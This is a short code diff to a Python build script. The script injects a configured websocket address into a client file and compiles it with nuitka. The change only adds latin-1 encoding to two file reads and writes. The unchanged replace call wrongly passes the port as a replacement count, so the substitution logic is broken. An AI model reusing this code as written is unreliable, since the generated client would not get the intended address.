@@ -17,14 +17,14 @@ config = ""
 
 def d_compile():
   content = ""
-  with open('client/main.py', 'r') as f:
+  with open('client/main.py', 'r', encoding='latin-1') as f:
     lines = f.readlines()
     for line in lines:
       if "%WEBSOCKET HERE%" in line:
         content+=line.replace("%WEBSOCKET HERE%", config['websocket']['ip'], config['websocket']['port'])
       else:
         content+=line
-  with open('build.py', 'w') as f:
+  with open('build.py', 'w', encoding='latin-1') as f:
     f.write(content)
   os.system("nuitka build.py --onefile")
 
